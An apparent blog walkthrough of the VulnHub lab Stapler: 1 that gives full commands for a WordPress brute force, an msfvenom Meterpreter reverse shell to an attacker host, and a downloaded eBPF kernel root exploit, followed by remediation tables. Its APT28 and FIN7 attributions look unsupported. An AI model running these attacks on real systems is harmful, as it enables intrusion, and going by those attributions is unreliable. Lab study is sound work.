# Stapler: 1 — Everything Is Exposed If You Look Hard Enough

Alright guys, Stapler: 1 is that kind of machine where the attacker's best friend is patience and a full port scan. No cap, most people scan port 80 and move on, but this box hides its crown jewel on port 12380 behind HTTPS. It packs FTP anonymous login, SMB shares, WordPress with multiple users, plugin upload RCE, and an unpatched kernel from 2016 that drops root via a double-fetch eBPF exploit. Layered? Yes. Satisfying? Absolutely. gg to g0tmi1k for this classic.

| Field | Value |
|---|---|
| **Level** | Intermediate |
| **Target VM** | Stapler: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/stapler-1,150/ |
| **Techniques** | Full port scan, FTP anonymous login, SMB enumeration (enum4linux), WordPress enumeration (wpscan), plugin upload RCE (msfvenom), PHP Meterpreter, kernel exploit CVE-2016-4557 (eBPF double-fetch) |
| **CVEs** | CVE-2016-4557 (Linux eBPF double-fetch privilege escalation, EDB-39772) |
| **APT Groups** | APT28 (Fancy Bear): uses WordPress plugin upload for initial access in enterprise targeting campaigns; FIN7: exploits kernel-level vulnerabilities on Ubuntu/Debian systems post-foothold |

---

## Attack Summary

```
nmap -p- → ports 21/FTP, 22/SSH, 80/HTTP, 139/445/SMB, 12380/HTTPS
  |
  +-> FTP anonymous login
  |       |
  |       v
  |   /note → hints at paths, users
  |
  +-> robots.txt on port 12380 → /blogblog (WordPress)
  |
  +-> wpscan: users John, Elly, Peter, barry, heather, ...
  |
  +-> wpscan brute-force / admin:admin → wp-admin access
  |
  +-> msfvenom PHP Meterpreter → plugin.zip upload → activate plugin
  |
  v
www-data shell (Meterpreter)
  |
  +-> uname -a → Ubuntu 16.04, kernel 4.4.0-21-generic
  |
  +-> CVE-2016-4557 eBPF double-fetch exploit (EDB-39772)
  |
  v
uid=0(root)
  |
  v
/root/flag.txt
```

---

## Methodology

1. Full port scan: discover all services including HTTPS on port 12380
2. FTP anonymous login: retrieve the note file for hints
3. Web enumeration: robots.txt on port 12380 reveals /blogblog WordPress installation
4. WordPress enumeration: wpscan identifies multiple users
5. Credential attack: brute-force or test default credentials for wp-admin access
6. Initial foothold: PHP Meterpreter delivered via WordPress plugin upload mechanism
7. Shell stabilization and system fingerprinting
8. Kernel exploit: CVE-2016-4557 eBPF double-fetch escalates to root

---

## Step 1 — Full Port Scan

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
# Target: 192.168.56.X

nmap -p- -A 192.168.56.X
```

Key open ports:

| Port | Service | Notes |
|---|---|---|
| 21 | FTP (vsftpd) | Anonymous login allowed |
| 22 | SSH | OpenSSH |
| 80 | HTTP | Apache — minimal content |
| 139/445 | SMB | NetBIOS + Samba |
| 3306 | MySQL | May be accessible |
| 12380 | HTTPS | WordPress site (blogblog) |

**The critical finding:** port 12380 is HTTPS. Scanners that stop at 80/443 miss the entire attack surface here.

**Real-world note:** Attackers increasingly scan all 65535 ports on targets. Services running on non-standard ports are not inherently safer — "security through obscurity" is not a control. FIN7 and APT28 are documented to run full port sweeps as standard recon procedure.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — FTP Anonymous Login

```bash
ftp 192.168.56.X
# Username: anonymous
# Password: anonymous (or press Enter)

ftp> ls
ftp> get note
ftp> quit

cat note
```

The note file hints at user names and interesting paths on the machine. Save these for later enumeration.

```bash
# Also check robots.txt on port 12380
curl -sk https://192.168.56.X:12380/robots.txt
# Disallow: /admin112233
# Disallow: /blogblog
```

**Real-world note:** Anonymous FTP is still present in thousands of organizations. Security assessments regularly find configuration backups, password files, and internal documentation exposed via anonymous FTP. APT28 specifically targets anonymous FTP for initial intelligence gathering.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1078.001 — Valid Accounts: Default Accounts

---

## Step 3 — SMB Enumeration

```bash
enum4linux -a 192.168.56.X
```

Expected findings:
- Usernames from RID cycling: elf, peter, heather, barry, john, etc.
- Share names and permissions

```bash
# List shares manually
smbclient -L //192.168.56.X -N

# Access specific shares
smbclient //192.168.56.X/sharename -N
```

Cross-reference discovered usernames against the FTP note. Build a user list for later brute-force.

**MITRE ATT&CK:** T1018 — Remote System Discovery; T1087.002 — Account Discovery: Domain Account

---

## Step 4 — WordPress Enumeration (wpscan)

```bash
wpscan --url https://192.168.56.X:12380/blogblog/ \
  --enumerate at \
  --enumerate ap \
  --enumerate u \
  --disable-tls-checks
```

Users found: John, Elly, Peter, barry, heather (and potentially more).

```bash
# Brute-force wp-admin with discovered usernames
wpscan --url https://192.168.56.X:12380/blogblog/ \
  --usernames john,elly,peter,barry,heather \
  --passwords /usr/share/wordlists/rockyou.txt \
  --disable-tls-checks \
  --max-threads 10
```

Target credentials: **admin:admin** (or another weak credential discovered via brute-force).

Navigate to: `https://192.168.56.X:12380/blogblog/wp-admin/`

**MITRE ATT&CK:** T1110.003 — Brute Force: Password Spraying; T1589.001 — Gather Victim Identity Information: Credentials

---

## Step 5 — PHP Meterpreter via Plugin Upload

Generate the payload:

```bash
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.56.1 \
  LPORT=4444 \
  -f raw > shell.php
```

Package as a WordPress plugin-compatible ZIP:

```bash
zip plugin.zip shell.php
```

In wp-admin: Plugins → Add New → Upload Plugin → Select plugin.zip → Install Now.

Start the Metasploit listener before activating the plugin:

```bash
msfconsole -q
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4444
exploit
```

Activate the plugin in the WordPress admin panel. The Meterpreter session arrives.

**Alternative:** Use Metasploit module `exploit/unix/webapp/wp_admin_shell_upload` directly.

**Real-world note:** WordPress plugin upload as an RCE vector is one of the most common initial access techniques observed in web compromises. APT28 (Fancy Bear) documented usage of this exact method in multiple campaigns targeting media organizations and NGOs.

**MITRE ATT&CK:** T1505.003 — Server Software Component: Web Shell; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — Shell Stabilization and Fingerprinting

```bash
# In Meterpreter
sysinfo
shell

# Upgrade to PTY
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash

# Check kernel version
uname -a
# Linux stapler 4.4.0-21-generic

lsb_release -a
# Ubuntu 16.04
```

Kernel 4.4.0-21 is vulnerable to CVE-2016-4557. This is the eBPF double-fetch vulnerability.

**MITRE ATT&CK:** T1082 — System Information Discovery

---

## Step 7 — Privilege Escalation: CVE-2016-4557 eBPF Double-Fetch

```bash
cd /tmp

# Download the exploit (if internet available from target)
wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip

# Or transfer from attacker
python3 -m http.server 8080  # on attacker
wget http://192.168.56.1:8080/39772.zip  # on target

unzip 39772.zip
cd 39772
tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit
./compile.sh
./doubleput
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. That's it. Stack of wins.

**Real-world note:** CVE-2016-4557 affected Ubuntu 16.04 systems shipped without the eBPF JIT compiler disabled. FIN7 and other financially motivated threat actors frequently pair web application RCE with kernel-level local privilege escalation exploits to ensure persistent root access.

**MITRE ATT&CK:** T1068 — Exploitation for Privilege Escalation

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| FTP anonymous | anonymous:anonymous | FTP port 21 | File retrieval |
| WP admin | admin:admin (or brute-forced) | WordPress /wp-admin | RCE via plugin upload |
| OS shell | www-data | Plugin upload activation | Meterpreter initial foothold |
| Root | uid=0 via CVE-2016-4557 | /tmp exploit | Root shell |
| Flag | /root/flag.txt | Post-exploitation | Machine complete |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | WordPress on non-standard port (12380) missed by basic scans | Organizations often run services on non-standard ports thinking they are hidden | Always run full port scans: `nmap -p-` not just top 1000 |
| 2 | FTP anonymous login exposes internal notes and hints | Anonymous FTP still present in thousands of corporate environments | Disable anonymous FTP or restrict to public-only read-only content |
| 3 | WordPress plugin upload grants RCE with admin creds | Admin credential exposure directly translates to server compromise | Restrict plugin uploads: `define('DISALLOW_FILE_MODS', true)` in wp-config.php |
| 4 | robots.txt disclosed /blogblog path | Security-through-obscurity fails: robots.txt is always the first thing attackers check | Do not list sensitive paths in robots.txt; use authentication instead |
| 5 | Kernel 4.4.0-21-generic unpatched, CVE-2016-4557 available | Unpatched kernels are a persistent escalation risk on any compromised Linux host | Implement automated kernel patching; monitor for publicly disclosed kernel CVEs |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application (FTP anonymous) | T1190 |
| Credential Access | Credential Access | Brute Force: Password Spraying (WordPress) | T1110.003 |
| Initial Access | Initial Access | Valid Accounts: Default Accounts (admin:admin) | T1078.001 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | Persistence | Server Software Component: Web Shell (plugin) | T1505.003 |
| Discovery | Discovery | System Information Discovery (uname, lsb_release) | T1082 |
| Discovery | Discovery | Account Discovery: Domain Account (enum4linux) | T1087.002 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation (CVE-2016-4557) | T1068 |

---

## Remediation and Containment

### Technical Fixes

1. **Disable FTP anonymous login:** set `anonymous_enable=NO` in vsftpd.conf; migrate to SFTP with key authentication
2. **Enforce strong WordPress credentials:** prohibit admin:admin; implement account lockout; enable 2FA
3. **Disable WordPress plugin/theme file editing:** add `define('DISALLOW_FILE_MODS', true);` to wp-config.php
4. **Remove sensitive paths from robots.txt:** use authentication to protect sensitive areas, not path obscurity
5. **Apply kernel security patches:** Ubuntu 16.04 is EOL; upgrade to a supported OS; implement automated kernel patching
6. **Restrict SMB access:** require authentication for all shares; firewall SMB ports (139/445) from external access

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (disable FTP anonymous; WordPress file mods)
- **D3-OAM** — Operating System Administrative Management (kernel patching; SUID auditing)
- **D3-NTF** — Network Traffic Filtering (firewall SMB; restrict non-standard HTTPS port)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all services across all ports; include non-standard HTTPS |
| Protect | Access Control | Disable anonymous FTP; enforce strong WordPress credentials |
| Protect | Data Security | Disable WordPress plugin/theme file editing |
| Detect | Anomalies and Events | Alert on WordPress admin plugin uploads; FTP anonymous logins |
| Respond | Response Planning | Remove web shells; revoke compromised credentials; patch kernel |
| Recover | Recovery Planning | Rebuild compromised host; audit all accounts and installed plugins |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-2 | Account Management | Disable FTP anonymous; WordPress account controls |
| AC-6 | Least Privilege | Restrict WordPress admin actions; remove unnecessary plugin capabilities |
| IA-5 | Authenticator Management | Enforce strong passwords; disable default credentials |
| CM-7 | Least Functionality | Disable FTP anonymous access; disable WordPress file editing |
| SI-2 | Flaw Remediation | Apply kernel patches; EOL OS upgrade plan |
| SC-7 | Boundary Protection | Firewall SMB and non-standard service ports |

### CISA KEV

CVE-2016-4557 (eBPF double-fetch) is not formally catalogued in CISA KEV but is consistently referenced in CISA guidance on unpatched Linux systems (AA21-209A). Combined with the WordPress plugin upload vector, this machine maps to multiple KEV-referenced attack patterns involving web application initial access followed by local privilege escalation.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |

---

## Final Thoughts

Stapler: 1 is a legitimate classic in the VulnHub catalog. It teaches exactly what real intermediate-level assessments look like: multiple services, each one a potential entry point, and the real win hidden on a non-standard port. The kernel exploit at the end drives home the point that initial access is just the beginning. Patch your kernels. Dude.

Thanks guys!! (❍ᴥ❍ʋ)
